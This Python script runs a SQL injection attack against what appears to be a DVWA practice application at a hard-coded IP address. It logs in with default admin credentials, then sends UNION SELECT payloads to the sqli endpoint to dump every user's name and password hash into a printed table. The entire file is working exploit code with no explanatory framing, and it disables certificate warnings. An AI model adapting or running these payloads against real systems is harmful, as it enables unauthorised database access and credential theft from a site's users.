
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

url_base = "http://31.97.117.123"
session = requests.Session()

# Login
login_url = f"{url_base}/login.php"
response = session.get(login_url, verify=False)
token_match = re.search(r"name='user_token'\s+value='([^']+)'", response.text)
user_token = token_match.group(1)

payload = {
    "username": "admin",
    "password": "password",
    "user_token": user_token,
    "Login": "Login"
}

response = session.post(login_url, data=payload, verify=False, allow_redirects=True)
print("[+] Logged in successfully\n")

sqli_url = f"{url_base}/vulnerabilities/sqli/"

print("[*] EXTRACTING ALL USERS WITH PASSWORD HASHES\n")
print("=" * 80)

# Extract all users from the database
all_users = []

# Use UNION SELECT to get both username and password columns
payload_str = "-1' UNION SELECT GROUP_CONCAT(user), GROUP_CONCAT(password) FROM users #"
response = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)

# Extract the pre section
pre_match = re.search(r'<pre>(.*?)</pre>', response.text, re.DOTALL)
if pre_match:
    result_text = pre_match.group(1)
    print(result_text)

print("\n" + "=" * 80)
print("\n[*] Now extracting detailed information...\n")

# Extract each user individually to get all columns
for user_id in range(1, 100):  # Try IDs up to 100
    # Get first_name, last_name
    response1 = session.get(sqli_url, params={"id": str(user_id), "Submit": "Submit"}, verify=False)
    
    # Get user, password via UNION
    payload_str = f"{user_id}' UNION SELECT user, password FROM users WHERE user_id={user_id} #"
    response2 = session.get(sqli_url, params={"id": payload_str, "Submit": "Submit"}, verify=False)
    
    # Extract results from response1
    pre_match1 = re.search(r'<pre>(.*?)</pre>', response1.text, re.DOTALL)
    if pre_match1:
        result1 = pre_match1.group(1)
        if "ID:" in result1 and f"ID: {user_id}" in result1:
            # Extract all lines
            lines = result1.strip().split('<br />')
            
            # Extract from response2 for username and password
            pre_match2 = re.search(r'<pre>(.*?)</pre>', response2.text, re.DOTALL)
            if pre_match2:
                result2 = pre_match2.group(1)
                lines2 = result2.strip().split('<br />')
                
                # Parse first response
                id_val = None
                fname = None
                lname = None
                for line in lines:
                    if "ID:" in line:
                        match = re.search(r'ID: (\d+)', line)
                        if match:
                            id_val = match.group(1)
                    elif "First name:" in line:
                        fname = line.replace("First name:", "").strip()
                    elif "Surname:" in line:
                        lname = line.replace("Surname:", "").strip()
                
                # Parse second response  
                username = None
                password = None
                for line in lines2:
                    if "First name:" in line and username is None:
                        username = line.replace("First name:", "").strip()
                    elif "Surname:" in line:
                        password = line.replace("Surname:", "").strip()
                
                if id_val and username and password:
                    print(f"[+] User ID: {id_val}")
                    print(f"    Username: {username}")
                    print(f"    First Name: {fname}")
                    print(f"    Last Name: {lname}")
                    print(f"    Password Hash: {password}")
                    print()
                    all_users.append({
                        "id": id_val,
                        "username": username,
                        "first_name": fname,
                        "last_name": lname,
                        "password_hash": password
                    })
        else:
            break
    else:
        break

print("\n" + "=" * 80)
print(f"\n[*] Total users extracted: {len(all_users)}\n")

# Print summary table
if all_users:
    print("[+] SUMMARY TABLE:")
    print("-" * 80)
    print(f"{'ID':<5} {'Username':<15} {'First Name':<15} {'Last Name':<15} {'Password Hash':<32}")
    print("-" * 80)
    for user in all_users:
        print(f"{user['id']:<5} {user['username']:<15} {user['first_name']:<15} {user['last_name']:<15} {user['password_hash']:<32}")
    print("-" * 80)

